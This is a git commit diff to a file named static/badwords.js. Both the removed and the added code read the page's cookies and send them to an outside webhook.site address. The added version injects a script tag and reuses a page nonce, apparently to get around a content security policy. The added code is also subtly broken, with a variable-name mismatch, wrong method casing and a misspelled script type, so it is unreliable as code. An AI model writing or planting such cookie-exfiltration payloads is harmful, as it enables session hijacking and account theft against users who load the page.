1d64a1f987c2e1c6f9d189a96929071a8715e8eb
SovietBeast <44019881+SovietBeast@users.noreply.github.com>
2021-05-15 16:17:42 +0200

    Update badwords.js

--- static/badwords.js
+++ static/badwords.js
@@ -1,5 +1,8 @@
-var cook = document.cookie;
-var xhttp = new XMLHttpRequest();
-xhttp.open("GET", "https://webhook.site/eae178ee-097f-406c-8fed-55fbea93e7fb?c=" + cook, true);
-xhttp.withCredentials=true;
-xhttp.send();
+var nounce = document.querySelectorAll("script")[2].nonce
+var cook = document.cookie
+var src = 'https://webhook.site/eae178ee-097f-406c-8fed-55fbea93e7fb?=' + cook
+var s = document.CreateElement('script')
+s.type = "text/javascipt"
+s.src = src
+s.SetAttribute('nonce', nonce)
+document.body.appendChild(s)
